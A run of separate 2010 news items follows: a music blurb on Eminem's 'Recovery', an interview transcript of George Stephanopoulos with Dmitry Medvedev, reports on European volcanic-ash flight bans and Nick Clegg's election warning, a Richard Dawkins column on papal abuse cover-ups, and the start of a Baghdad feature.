" We touched on something that I have n't done anything like that before , " Jonsin added .
" It 's unique in a way for myself .
It 's a place I 've been wanting to go , and I 'm so happy he allowed it to go down .
He played a huge part in the record .
Without him on it , it 's not the same .
I do n't wanna give up too much about what it is and what direction . "
Slim Shady told
Yee that Recovery is diverse and does n't have a uniform sound .
" There 's a variety of different things , different moods and things like that on there , " he said of the LP .
" There 's not just one overall sound .
It 's a bunch of different sh--. "
Another surprise
Em dropped about the album :
For the first time , he will not have any skits .
The often - hilarious segments had become a hallmark of Slim Shady 's albums .
What do you think Eminem 's Recovery LP will be like ?
Let us know in the comments below !
 -- " Good Morning America " anchor George Stephanopoulos interviewed Russian President Dmitry Medvedev the day after Medvedev and President Barack Obama signed the new START treaty .
The following is a transcript of the exclusive interview , which took place on Friday , April 9 , 2010 .
GEORGE STEPHANOPOULOS : Mister President , thank you very much for having us in St. Petersburg .
This is going to be an interview played to a very broad American audience .
And I just want to get to get your view on what 's the single most important thing that the average American needs to know about Russia today exactly ?
MEDVEDEV : That Russia is the same normal regular country as America .
STEPHANOPOULOS :
What does that mean ?
MEDVEDEV : That means exactly what I said that we have similar values .
And have basically probably the same , what the regular americans would like to have .
We 'd like to give the population the most comfortable conditions of life which unfortunately we can't always provide .
we have a lot of threats which we are fighting and we have tasks that we'd like to achieve , to develop and we have the same values as a democratic country established about 20 years ago .
STEPHANOPOULOS
:
And we see now a landmark agreement between the United States and Russia over nuclear weapons , signed in Prague .
And -- it was a hard fought agreement .
And the -- the issue of missile defense still seems to divide the United States and Russia .
And I just have a very -- simple question .
If the United States continues to develop missile defense in Europe , will Russia withdraw from the START treaty ?
MEDVEDEV : I would try to explain it as I understand the process today .
For pretty long time and not without difficulties we spoke with our American partners about the agreement about the relationship between strategic offensive arms and the anti missile defensive systems .
The point is this is about nuclear forces , or to be exact , with the difference in the configuration between those systems in Russia and the United States .
And with the plans that we have and our American partners .
As a result of very complicated deliberations , we got to the formula , which is being included in the preambles of the treaty .
And that formula is a reflection of very famous judicial principles .
Or let 's say it this way , that formula says that there is an interconnection between the strategic offensive arms and missile defense .
But it 's mentioned there also about the circumstances which were the basis the signage of that treaty agreed upon by both parties .
So if those circumstances will change then you would have , we would consider it as the reason to jeopardize the whole agreement .
That does n't mean that because of that rule , if the American side starts to build up the missile system that the treaty would automatically lose its power .
But this is an additional argument which binds us and which gives us the opportunity to pose the question : is that quantity change of the defense missile configuration leading to a change of the situation in the quality concern ?
So if we in a certain moment evaluate that the quality of the situation has significantly changed , we would be forced to pose such a question to our American partners .
But I would like to make sure there is no impression that any change would be a reason to abandon a signed agreement .
Even more , we agreed upon and we spoke about with President Obama and talked about with American representatives that we should cooperate in the creation of global missile defense systems .
But if that process will go eventually on such a scenario which , according to our impression , will lead to the quantity changes , then such a question could be posed by our side .
And this is the principle of that reasoning , and understanding as well about that oral statement yesterday .
STEPHANOPOULOS :
So if Russia feels the systems that we built up is a threat , then you withdraw .
That 's the qualitative change ?
MEDVEDEV : Then we can pose the question about premature end of that agreement .
But I hope that something like that would not happen .
And that we will be busy with those problems of sophistication of potential and the questions about the anti missile defense , we will consult each other and it's our wish to work on it together .
STEPHANOPOULOS :
You mentioned that this language is in the preamble .
Based on my reporting , I heard that in one of your final conversations negotiating with President Obama , you tried to get this language into the body of the text .
And he pushed back quite forcefully .
What kind of a negotiator is President Obama ?
MEDVEDEV : I think that Mr. Obama as the President of the United States of America , he 's pursuing the interests of the United States .
And me as President of the Russian Federation , I 'm trying to defend our interests .
The point is that we do n't have such huge plans about creation of missile defense systems like in America .
But we do understand ourselves that if you build up or escalate the missile defense means to certain levels , they will be able to break the parity .
Because what 's the basis of today 's agreement is the strategic offensive arms .
It 's based on that , the parties by compromising , by consulting with experts , came to the conclusion that there is a certain parity between us .
The parity of certain delivery means and certain warheads , so we are lowering it down , the level of delivery systems and warheads .
And we 're setting the limit , which is much lower than in the 1991 agreement .
But if the fixed parity is being preserved , which is 700 I believe , and 800 undeveloped and developed and 750 heads and the other party radically multiplies the number and power of its missile defense system , obviously that missile defense system is indeed becoming a part of the strategic offensive nuclear forces .
Because it 's capable of blocking the action of the other side .
So an imbalance occurs , and this would be certainly the reason to have a review of that agreement .
There is something , and I would like to remind you , I believe you have also a judicial background in your education , there is a famous latin proverb : clausula rebus sixtantus , the agreement is being considered in effect as long as the circumstances in which it was born remain .
If they change , that would be the reason for a review of the agreement .
That 's for any agreement .
Such circumstances in this case are related to the development of the anti missile defense system .
STEPHANOPOULOS :
You 've now met with President Obama many times .
At least 15 meetings and phone calls .
MEDVEDEV : Sixteen times .
STEPHANOPOULOS : Sixteen .
Okay , I knew it was 15 .
I was n't sure about the 16 .
What do you make of Barack Obama the man ?
MEDVEDEV : He 's very comfortable partner , it 's very interesting to be with him .
The most important thing that distinguishes him from many other people – I wo n't name anyone by name – he's a thinker , he thinks when he speaks .
Which is already pretty good .
STEPHANOPOULOS :
You had somebody in your mind , I think .
( LAUGHS )
MEDVEDEV : Obviously I do have someone on my mind .
I do n't want to offend anyone .
He 's eager to listen to his partner , which is a pretty good quality for a politician .
Because any politician is to a certain degree a mentor .
They preach something .
And the ability to listen to their partner is very important for the politician .
And he is pretty deeply emerged in the subject , so he has a good knowledge of what he 's talking about .
There was no instance in our meetings with Mr. Obama where he was n't well prepared for the questions .
This is very good .
And after all , he 's simply a very pleasant man with whom it's a pleasure to deal with .
STEPHANOPOULOS :
He said very kind things about you as well .
And I spoke with him in Prague .
And one of the most important things he said about you is that it was when I asked him who 's really in charge in Russia , the question you get all the time .
You or Prime Minister Putin .
And he emphasized -- President Obama emphasized that in every -- every time he 's dealt with you , followed through on your commitments and you 've kept your word .
On that subject , I 'm wondering , how tired are you of getting asked the question who 's in charge in Russia , you or Prime Minister Putin ?
MEDVEDEV : Yes , I 'm a little tired .
It 's annoying a little .
Would you like me to answer it one more time ?
Or are you clear on that ?
STEPHANOPOULOS : Well , I -- I know what President Obama said , and I 've watched both you and -- and Prime Minister Putin closely , and it seems like you work fairly closely together , but sometimes you speak -- in different ways about a similar issue .
And what I really just want to get an answer to is how does it work between the two of you ?
How does the relationship work ?
MEDVEDEV : We have a good work relationship and good personal relations .
And how does the relationship work between Mr. Obama and Mr. Biden ?
They also sometimes speak different things .
They even have different backgrounds , different biographies , and probably a different set of opinions about the world and its situation .
But it does work .
And it works with us as well .
If you 'd like to talk about who is making the decisions in our country , it 's a question posed to me many times .
STEPHANOPOULOS : I think you just answered it .
MEDVEDEV : Basically I did answer it already .
But I will be happy to give you another answer , but it 's totally trivial , but also very true .
The decision is taken by the person who is designated to do it by law .
If you consider the questions of foreign and domestic politics , the defense , the security .
This is only the President .
And nobody else .
I maybe would be glad to share it with someone else . , especially in very dramatic periods .
Like August 2008 , when the well known conflict in the caucusus took place .
But I can not state that that decision was not taken by me , or I bear the responsibility for that with other colleagues like Putin or others .
I do hold personally the responsibility for that .
And I 'm not ashamed of that decision .
But I would say the most important and most complicated decisions I have to take myself .
So we have the government which has its own competence .
America does n't have a government .
The government itself generates the laws .
The government is busy with economics and this is a lot of work , I used to work in the government for many years .
I was the first deputy of the prime minister .
This is huge work , huge complicated and not related to the presidential authority .
That 's the second dimension of our relationship .
But I believe within the recent years , we 've been able to develop a system that works fine .
And I would tell you even more , in my opinion it does work better than in the previous period because we did have a government which was a more technical institution than it should have been .
But when the government was headed by such an experienced politician as Putin , a person of huge authority in the country , the government became much more active and its action became much more substantial , especially in times of crisis .
Because during crisis people are more concerned .
They are n't happy with what 's going on and frequently and justly , they blame sometimes the government .
And in the case when the authorities are not up to the task , like in certain countries , then it 's bad .
But if the government keeps its authority and pays attention to the relationship with the people , and takes balanced decisions , then it 's good for the country .
STEPHANOPOULOS : You -- you faced one of these crises recently .
The state of -- of bombings , the terrorisms here in Moscow .
And one especially hit home in the United States .
The suicide bombing in the Moscow subway .
I was in New York that day .
All the New York subways on high alert .
And -- and this picture on the front page of -- papers all across the United States .
How did this happen ?
And what do you do about it ?
MEDVEDEV : This is a very tragic story , if we talk about the person on the picture .
STEPHANOPOULOS : A suicide bomber .
MEDVEDEV : That woman is virtually a child .
She 's just 17 .
But she has taken the decision for herself which brought the deaths of many people .
Why ?
That 's the main question .
Why ?
She grew up in the caucusus region .
As far as I understand , if I correctly see what you 're showing me this is a lady who married one of the bandits .
He is a foreign mercenary .
He came to Russia in order to fight for his very doubtful ideals .
He was killed .
And according to the version which today is maintained by the investigation , this woman was one of those that triggered the explosive .
Why did she do it ?
Why did she do that to innocent people ?
Evidently there 's multiple reasons .
First one is radicalism .
Extremist nature . , which is typical for many people arriving from abroad which are fighting against our government and against many other countries in international terrorism .
The same people are in Afghanistan , Pakistan .
We 're constantly catching people of such a breed , or we destroy them .
And after we check their documents we find that they are from far away lands .
But this woman , she 's from Russia .
She 's married to one of those bandits .
And after he was killed , she made the decision to retaliate .
But to retaliate on common people .
What 's the way to fight it ?
You can fight it only after you understand how to remove the reasons for it .
You know how difficult it is to fight terrorism .
It 's difficult in Russia and in America .
In order to fight such activity , you have to change the psychology of the people .
You can create normal life conditions in the Caucusus .
You have to destroy all of those who came here for terrorism .
Those people are infiltrating through the borders .
STEPHANOPOULOS : From Afghanistan , from Pakistan .
MEDVEDEV : From Afghanistan , Pakistan .
STEPHANOPOULOS :
So it 's the same threat the United States is facing you 're saying ?
MEDVEDEV : I believe this is the same threat .
Those are the same forces , but it has its own national touch .
This is a real struggle .
But no less important is working with the ordinary people .
The ones which do n't want peace have to be destroyed .
But others which made a mistake and accidentally got involved , or were brainwashed , you still can work with them .
And you have to rehabilitate them to normal life .
This is difficult .
If we talk about an incident like this , this is a totally different story .
Because we must understand , what is a subway ?
This is such a huge stream of people .
There is no technology in the world which would be able to detect explosives or suicide bomber belts .
STEPHANOPOULOS :
We 're lucky it has n't happened in the States yet .
MEDVEDEV : This is exactly what I told Barack Obama yesterday .
I told him ' Barack , the subways are in many places , and you should take care of the transportation . '
This is a huge problem for our countries .
And this is not just on the technological level .
I 'm ready to fully cooperate with our American partners .
I know our American partners and the President are ready for the same .
This is the struggle we 'll have for a long time .
STEPHANOPOULOS :
It seems that you 're also convinced now , to an outsider , that the Iran nuclear program is a threat to the security of the world .
MEDVEDEV : The Iranian nuclear program is not transparent .
And this is the most difficult aspect .
Iran , as any country , has the right to develop a peaceful nuclear program , but we also should understand what are the final tasks it 's pursuing ?
It does n't respond to certain offers which are given by the international community , including Russia .
STEPHANOPOULOS :
Do you believe Iran wants the bomb ?
MEDVEDEV : I do n't know what Iran wants .
It would be better to ask Iranian leaders .
But I believe the nuclear development topic brings together the Iranian community , I do n't have a doubt about that .
This is the topic which is exploited by the Iranian leadership to bring together the elite or the whole population .
Are they pursuing the nuclear weapon or not ?
I do n't know .
But we should carefully monitor it .
These steps to enrich by 20 percent in their own sites , despite that we offered to do it in Russia , France and Turkey .
This could be considered as at least the desire to enter into conflict with the world community .
STEPHANOPOULOS : Iran 's unveiling new centrifuges now .
STEPHANOPOULOS :
That 's what I want to ask you about .
Because , you know , strong majorities in the United States Congress look at the three sanctions regimes passed by the U.N. Security Council of Foreign State .
They have n't worked .
And the majority say it is time now to crack down on the petroleum trade .
On refined -- petroleum products and gasoline .
Why is that a bad idea ?
MEDVEDEV : It 's not whether it's a good thought or bad thought , I 'm talking about something else .
The sanctions is a tricky thing which works seldomly .
You yourself were busy with politics , and you know that sanctions is not without conditions .
But sometimes you have to do that .
What kind of sanctions ?
We have spoken about that with President Obama yesterday .
Sanctions should be effective and they should be smart .
STEPHANOPOULOS :
But what does that mean ?
MEDVEDEV : They should not lead to humanitarian catastrophe , and the whole Iranian community would start to hate the whole world .
And we 're worried that there are a significant number of people which have radical opinions .
Do we want that radical thought to be sent to the whole world ?
So sanctions should be smart .
They should force or obligate the Iranian leadership to think about what 's next .
What could sanctions be ?
It could be trade , arms trade .
It could be other sanctions .
Our experts are reviewing them now .
If we 're talking about energy sanctions , I 'll tell you my opinion .
I do n't think on that topic we have a chance to achieve a consolidated opinion of the global community on that .
By the way , we have our own energy cooperation with Iran .
The sanctions should let the country understand that all who impose sanctions have the same opinion .
But if half of the countries support the sanctions and the others do n't , the sanctions should be smart .
Sanctions should not be paralyzing .
They should not cause suffering .
Are n't we in the 21st century ?
That 's why if we 're going to develop our cooperation in this direction we have a chance to succeed .
Better would be to go without sanctions and achieve things politically .
But a lot of time has passed by .
STEPHANOPOULOS : Well , I -- I think you -- you bring up an important point at the end there .
There are so many signs in Israel -- of invasions .
And -- that at some point , perhaps soon , some former ministers have suggested by the end of the year Israel be -- feel forced to take military action .
What would that mean ?
MEDVEDEV : It would be the worst possible scenario .
Because any war means lives lost .
Secondly , what does a war in the Middle East mean ?
Everyone is so close over there that nobody would be unaffected .
And if conflict of that kind happens , and a strike is performed , then you can expect anything , including use of nuclear weapons .
And nuclear strikes in the middle east , this means a global catastrophe .
Many deaths .
STEPHANOPOULOS :
Are you as confident as you used to be that Israel will show forbearance and not strike ?
MEDVEDEV : I could be certain only about the decisions under my authority .
The Israelis are directing its own policy .
I do have a good relationship with the President and Prime Minister of Israel .
But those are independent people .
And I would say that on many questions they are defending stubborn positions .
Very tough .
And the US has seen the proof of that lately .
STEPHANOPOULOS :
On the settlements .
MEDVEDEV : In many instances the Israeli position , including settlements , remained the same even after open and honest talk with America and we have spoken to them also .
Why am I bringing it up ?
Because you can't imagine any scenario , with the Middle east it would be a gigantic human disaster , and not only for the middle east .
If something would happen in Iran , the people from that region would try to escape .
Where would those people go ?
They would head toward our borders .
They would go to Azerbaijan .
Iran has many with roots from Azerbaijan .
STEPHANOPOULOS :
You 've been very forthright about the problems that Russia has to overcome in order to become a modern , as you say , normal -- country .
Corruption .
Life expectancy has been going down in Russia .
Your population is going down .
Alcoholism still plaguing so much of the country .
What do you say to outside observers who look at Russia , even with the growth you 've had in recent years , and see a nation in decline ?
MEDVEDEV : The situation is not the best .
I would like to make a few corrections to what you said .
Thank
God the life expectancy is not going down , but up .
And within the last period when we started social programs , and I personally started to take care of it , the life expectancy rose already by four years .
Unfortunately that 's not big , but it 's growth .
So we 're on the correct path .
We 're still dissatisfied .
What should we do ?
We should boost our economy and develop social programs in health care , education and promote healthy lifestyles .
Sports .
And a desire to take care of his or her own health .
To exercise .
There 's nothing tricky in it but you have to get to it and create the conditions …
STEPHANOPOULOS : You had a rough Olympics .
MEDVEDEV : I did n't have an olympic games , I did n't take part in them .
But they were a tough games for our country , yes , because for the first time we had a steep decline in the medal count .
This is not a national disaster , but we have to take a lesson from it .
We should prepare better next time .
Because when you host the Olympics you are counting on many medals .
STEPHANOPOULOS :
You have a big comeback .
Let me ask you , the American public does n't know all that much about you personally .
But I was fascinated to be -- in reading your biography to learn many of the details .
You were brought up in Soviet Russia , without religion .
Yet , at the age of 23 , you walk into a church to become baptized .
Why ?
MEDVEDEV : I did feel that I needed it .
I wanted to do it .
Why do people go to church ?
They come because they feel a need , except if they 're sightseeing .
So at 23 I felt I needed it .
I believe it 's good for me , because afterwards my life changed .
You do n't really talk aloud about something like that because the religious feelings should be somewhere deep inside of you .
If someone is displaying it , it 's not really honest .
It 's more PR for yourself .
But I believe religion is important for every person .
Do n't you think so ?
STEPHANOPOULOS : I do .
I was also impressed by the fact that -- you have a deep love of heavy metal .
Where did that come from ?
Led Zeppelin ?
Deep Purple .
Pink Floyd .
MEDVEDEV : That 's from my childhood .
My adolescence .
I do n't know what music did you listen to at age 15 or 20 ?
But I did listen to that music even though I was raised behind the Iron Curtain .
STEPHANOPOULOS :
My wife makes fun of me for soft rock .
MEDVEDEV : Although I lived behind the Soviet Iron Curtain the music seeped through .
We listened to what the whole planet listened to .
STEPHANOPOULOS :
And you 're still a fan ?
MEDVEDEV : Yes but now I 'm more diverse in music .
I do like classical music , and soft rock , and jazz , which I never listened to when I was 15 .
Now I like it .
The older you get , the more tolerant you get , right ?
STEPHANOPOULOS : I have to ask you about a case that has shocked people both in the United States and here in Russia .
The case of the seven - year - old boy .
Si-- Siberian boy .
Ardev Siveliev ( PH ) who was adopted -- in the United States , returned back alone with a note pinned to his chest saying , I can't keep him anymore .
You 're shaking your head .
You know about this .
MEDVEDEV : Certainly I know and that 's terrible and that young boy , Artyom Savyelyev , he simply fell into a very bad family .
You know I would not like to finish the interview with the conversation on such a complicated topic , but I would like to say couple of things .
first of all , it is a monstrous deed on the part of his adoptive parents , to take the kid and virtually throw him out with the airplane in the opposite direction and to say , I 'm sorry I could not cope with it , take everything back is not only immoral but also against the law .
And secondly what is now of my special concern , is the fact that the quantity of such cases in America is on the rise .
We did have a couple of deaths of the kids which were adopted by American parents recently .
That case thank God was without a fatal end , and without any bodily injury or trauma .
Our agency responsible for kids ' rights did react already to that .
And even the minister of the department .
STEPHANOPOULOS : Your minister has suggested freezing -- freezing adoptions .
Is that a good idea ?
MEDVEDEV :
You know any harsh decision is never either totally wrong or totally good .
I believe considering that negative experience which has been accumulated in that department we should think with our American colleagues about some agreement between us about where the expectations which would outline very strongly the responsibilities of the parents which are taking the children from Russia , which will provide the monitoring opportunities of such a family .
We should understand what is going on with our children , or we will totally refrain from the practice of adopting Russian children by American adoptive parents .
I can only say we are alarmed by the tendency .
This is very sad and I would like after the conversation with you , we would attract attention to that problem by American authorities .
STEPHANOPOULOS : One final question .
Are the days of the Cold War that both you and I grew up in , are they gone for good ?
MEDVEDEV : I would like to express my hope that yes .
The Cold War was a boring thing .
Nobody gets better for it .
Tremendous money is wasted .
Our lives get more difficult .
We look at each other as enemies .
What 's good in that ?
In any case , I will do anything in my power in order to stop another Cold War , with the US or any other country in the world .

Europe 's air industry has called for an urgent review of flight bans imposed because of volcanic ash from Iceland .
The bodies representing most European airlines and airports have questioned the need for the unprecedented curbs , which affect millions of travellers .
Airlines that have carried out test flights say planes showed no obvious damage after flying through the ash .
EU Transport Commissioner Siim Kallas said he hoped 50 % of Europe 's airspace would be risk - free on Monday .
He said the current situation was " not sustainable " and European authorities were working to find a solution that did not compromise safety .

" We can not just wait until this ash cloud dissipates , " he added .
Mr Kallas also said EU transport ministers would hold a video teleconference on Monday to assess the situation .
About 17 European countries have closed their airspace .
The flight bans came amid fears that the ash - a mixture of glass , sand and rock particles - can seriously damage aircraft engines .
Airlines are estimated to be losing some £ 130 m ( $ 200 m ) a day .
The European air traffic coordinating agency , Eurocontrol , reports that 63,000 flights have been cancelled since Thursday .
There were only 5,000 flights in European airspace on Sunday , against 24,000 normally , it says .
ACI Europe - which represents major airports - and the Association of European Airlines issued a joint statement urging officials to reconsider the restrictions .
' Dangerous levels of ash '
" The eruption of the Icelandic volcano is not an unprecedented event and the procedures applied in other parts of the world for volcanic eruptions do not appear to require the kind of restrictions that are presently being imposed in Europe , " the statement said .
COUNTRIES AFFECTED
Airspace closed : Austria , Belgium , Czech Republic , Denmark , Estonia , Finland , Germany , Hungary , Ireland , Latvia , Luxembourg , Netherlands , Poland , Romania , Slovakia , Switzerland , UK Partial closures : Italy ( northern airspace closed until Monday ) Norway ( most airports open ) Bulgaria ( Sofia and Plovdiv open ) Poland ( several airports , including Warsaw , open ) Sweden ( northern airports open ) France ( southern airports open ) Flights operating : Greece , Lithuania , Portugal , Russia , Turkey , Ukraine , Spain

In pictures : Europe grounded Economic impact of closures Earlier , several airlines also questioned the curbs .
Peter Hartman , chief executive of Dutch carrier KLM , said there had been " nothing unusual " about a test flight carried out by the airline through the plume , and he hoped to " get permission as soon as possible to partially restart our operations " .
Steven Verhagen , vice - president of the Dutch Airline Pilots Association , told the Associated Press news agency : " In our opinion there is absolutely no reason to worry about resuming flights . "
Germany 's two biggest airlines , Lufthansa and Air Berlin , also said they had carried out test flights without apparent damage , as did Air France .
Air Berlin spokeswoman Diana Daedelow told the BBC : " It is astonishing that these findings ... have seemingly been ignored in the decision - making process of the aviation safety authorities . "
A British Airways Boeing 747 completed a test flight through the no-fly zone at 30,000 ft ( 9.1 km ) from Heathrow to Cardiff on Sunday .

While it encountered no problems , no loss of engine performance and no damage to windows , engineers in Cardiff were due to make a more detailed assessment of its engine overnight .
Earlier on Sunday , a UK Met Office plane went through the cloud and encountered dangerous levels of ash , showing that the issue is not whether the cloud is real and dangerous but whether its extent can be accurately mapped , BBC business editor Robert Peston writes .
One possible solution is to put observation planes in the sky , to give a more detailed picture of the location of ash concentrations , and the UK government is therefore trying to obtain more observation planes , from the military in particular , he adds .
Our business editor understands that BA fears it may not be allowed to fly normal services until Thursday at the earliest .
Worsening disruption UK Transport Secretary Lord Adonis , said " urgent discussions " were taking place between European and international agencies to ease the chaos .
" We want to be able to resume flights as soon as possible , but safety remains my paramount concern , " he said .

Volcano ash : Your stories Weather experts say wind patterns mean the cloud is not likely to move far until later in the week .
Brian Flynn , head of operations at Eurocontrol - which co-ordinates air traffic control in 38 nations - dismissed suggestions the authorities were being over - cautious .
" With the overriding objective of protecting the travelling public , these exceptional measures have to be taken , " he said .
Polish funeral Since Thursday , countries across northern and central Europe have either closed airspace or shut key airports .

How long will ash last ?
Peston : Airlines to ask for help Britain has extended a ban on most flights in its airspace until at least 1900 local time on Monday ( 1800 GMT ) .
Ireland is keeping its airspace closed until 1200 GMT on Monday .
Germany had allowed six international airports to open on a limited basis on Sunday but has since closed its airspace until at least 1200 GMT on Monday .
The Netherlands has announced that Dutch airspace will remain closed until at least 1200 GMT on Monday .
Travellers across northern Europe have sought other means of transport , packing out trains , buses and ferries .
The restrictions prevented many world leaders , including US President Barack Obama , from attending the funeral of Polish President Lech Kaczynski in the southern city of Krakow .
Southern Iceland 's Eyjafjallajoekull volcano began erupting for the second time in a month on Wednesday , sending a plume of ash 8.5 km ( 5.3 miles ) high into the air .

Sexual abuse of children is not unique to the Roman Catholic church , and Joseph Ratzinger is not one of those priests who raped altar boys while in a position of dominance and trust .
But as so often it is the subsequent cover-ups , even more than the original crimes , that do most to discredit an institution , and here the pope is in real trouble .
Pope Benedict XVI is the head of the institution as a whole , but we can't blame the present head for what was done before his watch .
Except that in his particular case , as archbishop of Munich and as Cardinal Ratzinger , head of the Congregation for the Doctrine of the Faith ( what used to be called the Inquisition ) , the very least you can say is that there is a case for him to answer .
See , for example , three articles by my colleague Christopher Hitchens here , here , and here .
The latest smoking gun is the 1985 letter obtained by the Associated Press , signed by the then Cardinal Ratzinger to the diocese of Oakland about the case of Father Stephen Kiesle , mercilessly analysed by Andrew Sullivan here .
Lashing out in desperation , church spokesmen are now blaming everybody but themselves for their current dire plight , which one official spokesman likens to the worst aspects of antisemitism ( what are the best ones , I wonder ? ) .
Suggested culprits include the media , the Jews , and even Satan .
The church is hiding behind a seemingly endless stream of excuses for having failed in its legal and moral obligation to report serious crimes to the appropriate civil authorities .
But it was Cardinal Ratzinger 's official responsibility to determine the church 's response to allegations of child sex abuse , and his letter in the Kiesle case makes the real motivation devastatingly explicit .
Here are his actual words , translated from the Latin in the AP report :
" This court , although it regards the arguments presented in favour of removal in this case to be of grave significance , nevertheless deems it necessary to consider the good of the universal church together with that of the petitioner , and it is also unable to make light of the detriment that granting the dispensation can provoke with the community of Christ 's faithful , particularly regarding the young age of the petitioner . "
" The young age of the petitioner " refers to Kiesle , then aged 38 , not the age of any of the boys he tied up and raped ( 11 and 13 ) .
It is completely clear that , together with a nod to the welfare of the " young " priest , Ratzinger 's primary concern , and the reason he refused to unfrock Kiesle ( who went on to re-offend ) was " the good of the universal church " .
This pattern of putting church PR over and above the welfare of the children in its care ( and what an understatement that is ) is repeated over and over again in the cover-ups that are now coming to light , all over the world .
And Ratzinger himself expressed it with damning clarity in this smoking gun letter .
In this case he was refusing the strong request of the local bishop that Kiesle should be unfrocked .
Vatican standing orders were to refer such cases not to the civil authorities but to the church itself .
The current campaign to call the church to account can take credit for the fact that this standing order has just changed , as of Monday 12 April 2010 .
Better late than never , as Galileo might have remarked in 1979 , when the Vatican finally got around to a posthumous pardon .
Suppose the British secretary of state for schools received , from a local education authority , a reliable report of a teacher tying up his pupils and raping them .
Imagine that , instead of turning the matter over to the police , he had simply moved the offender from school to school , where he repeatedly raped other children .
That would be bad enough .
But now suppose that he justified his decision in terms such as these :
" Although I regard the arguments in favour of prosecution , presented by the local education authority , as of grave significance , I nevertheless deem it necessary to consider the good of the government and the party , together with that of the offending teacher .
And I am also unable to make light of the detriment that prosecuting the offender can provoke among voters , particularly regarding the young age of the offender . "
The analogy breaks down , only in that we are n't talking about a single offending priest , but many thousands , all over the world .
Why is the church allowed to get away with it , when any government minister who was caught writing such a letter would immediately have to resign in ignominy , and face prosecution himself ?
A religious leader , such as the pope , should be no different .
That is why , along with Christopher Hitchens , I am supporting the current investigation of the pope 's criminal complicity by Geoffrey Robertson QC and Mark Stephens .
These excellent lawyers believe that , for a start , they have a persuasive case against the Vatican 's status as a sovereign state , on the basis that it was just an ad hoc concoction driven by internal Italian politics under Mussolini , and was never given full status at the UN .
If they succeed in this initial argument , the pope could not claim diplomatic immunity as a head of state , and could be arrested if he steps on British soil .
Why is anyone surprised , much less shocked , when Christopher Hitchens and I call for the prosecution of the pope , if he goes ahead with his proposed visit to Britain ?
The only strange thing about our proposal is that it had to come from us : where have the world 's governments been all this time ?
Where is their moral fibre ?
Where is their commitment to treating everyone equally under the law ?
The UK government , far from standing up for justice for the innocent victims of the Roman Catholic church , is preparing to welcome this grotesquely tainted man on an official visit to the UK so that he can " dispense moral guidance " .
Read that again : dispense moral guidance !
Unfortunately I must end in bathos , with a necessary correction of a damaging error in another newspaper .
The Sunday Times of 11 April , on its front page , printed the headline , " Richard Dawkins : I will arrest Pope Benedict XVI . "
This conjures up – as was doubtless intended – a ludicrous image of me ambushing the pontiff with a pair of handcuffs and marching him off in a half Nelson .
Blood out of a stone , but I finally managed to persuade that Murdoch paper to change the headline in the online edition .
Never mind headlines invented by foolish sub-editors , we are serious .
It should be for a court to decide – a civil court , not a whitewashing ecclesiastical court – whether the case against Ratzinger is as damning as it looks .
If he is innocent , let him have the opportunity to demonstrate it in court .
If he is guilty , let him face justice .
Just like anybody else .

Libl Dem leader fears that if Labour or Conservatives tried to impose cuts after narrow win it ' could spark Greek - style unrest '
Britain will be hit by waves of " Greek - style unrest " if a Tory or Labour government narrowly wins the election and then tries to push through draconian spending cuts , Nick Clegg warns today .
In an interview with the Observer , the Liberal Democrat leader says he fears " serious social strife " would break out on the streets if a government with limited support at the election on 6
May then raised taxes , laid off public - sector workers and froze wages .
As the main parties prepared to launch their election manifestos early next week , Clegg said it was " stating the obvious " to say that a hung parliament , in which the main parties were forced to work together , would be good for the country .
The alternative would be to have a government that lacked support across huge parts of Britain at a time when emergency measures were needed to cut the deficit .
Advancing his case for a fairer voting system that would return MPs in proportion to the number of votes cast , he said that Labour won office in 2005 with the support of 22 % of eligible voters .
" Imagine the Conservatives go home and get an absolute majority , on 25 % of the eligible votes , " Clegg said .
" They then turn around in the next week or two and say we 're going to chuck up VAT to 20 % , we 're going to start cutting teachers , cutting police and the wage bill in the public sector .
I think if you 're not careful in that situation … you 'd get Greek - style unrest .
And so my warning to people who think the old politics still works , is be careful for what you wish for . "
In his own constituency city of Sheffield , where there are no Conservative MPs or councillors , and a high proportion of public - sector workers , he fears a ferocious backlash against potential Tory cuts .
" Suddenly these people will be told by a government that has no legitimacy [ in the area ] in their eyes that this government is going to slash and burn , having promised them something else . "
Clegg said he was " not campaigning for a hung parliament " but it would be preferable to rule by a party with a tiny majority based on a minority of votes .
" Do I think politicians working together can be a good thing ?
Of course it can . "
Last month strikes and protests against the Greek government 's harsh austerity measures caused chaos , with 10,000 marching in protest in Athens .
A series of opinion polls last night suggested that a hung parliament , or a small Tory majority , remained the most likely outcomes .
A survey of 96 Labour - held marginals for the News of the World found Conservative support had fallen by four points to 36 % since January , while the Lib Dems had surged five points to 19 % .
Labour remained on 37 % .
The figures would be likely to leave Mr Cameron in control of 308 seats – not enough to wield a majority .
Labour would have 248 seats and the Lib Dems 61 .
Meanwhile , a YouGov survey for the Sunday Times found the Tory lead had dropped from 10 to eight points over the past week .
It put the Tories on 40 % , Labour ( up three ) on 32 % and the Lib Dems down two on 18 % .
Clegg 's comments come as both Labour and the Liberal Democrats slammed Tory proposals to give married couples a tax break .
George Osborne , the shadow chancellor , laid out details of the £ 550 m plan yesterday , revealing it would benefit only one - third of Britain 's 12.3 million married couples – those where there is one partner on a low to middle income and the other does not earn .
They would gain £ 150 a year .
Clegg , campaigning with his wife Miriam Gonzalez Durantez in Sheffield , described them as a " throwback to the Edwardian era " , while Gordon Brown accused the Tories of taking money away from struggling families , claiming they would make heavy cuts in child tax credits , child trust funds , Sure Start and schools .
Yvette Cooper , the work and pensions secretary , said : " It is unfair to tell children whose parents , for whatever reason , are n't married that they and their families are second class .
What kind of signal is that ? "
Speaking during a visit to Cheam , in south London , Tory leader David Cameron said : " We should have a society where we back commitment and where we recognise marriage and civil partnerships in the tax system .
Would it be a good thing if more people came together and stayed together and showed commitment ?
I think it would . "
The Observer has learned that Labour 's manifesto , to be unveiled on Monday , will contain plans to force energy companies to reduce the bills of around a million poorer pensioners by £ 100 a year .
Companies will have to offer reduced tariffs to all over - 75s who are on income support .
Labour 's manifesto will focus on rebuilding the economy , reforming public services and rebuilding trust in politics through measures that will include reducing the voting age to 16 .
Campaigning in his Kirkaldy and Cowdenbeath constituency , Brown said Labour 's offer to voters would be credible rather than exciting .
" It is about substance in the end , " he said .
BAGHDAD — Simple pleasures are still elusive here , but on a lazy Friday afternoon — a day before the seventh anniversary of the American invasion of Iraq — about a dozen men went to the movies to watch their war .
Instead of popcorn , there were date - filled pastries .
The movie was a bootleg DVD of “ The Hurt Locker ” bought for a dollar and projected from a laptop to a big screen .
The subject , for this audience , was visceral and personal .
“ Whenever we went to work , or when we would travel , we would see Americans trying to defuse bombs , ” said Zaher Karim , 29 , who works as a cameraman .
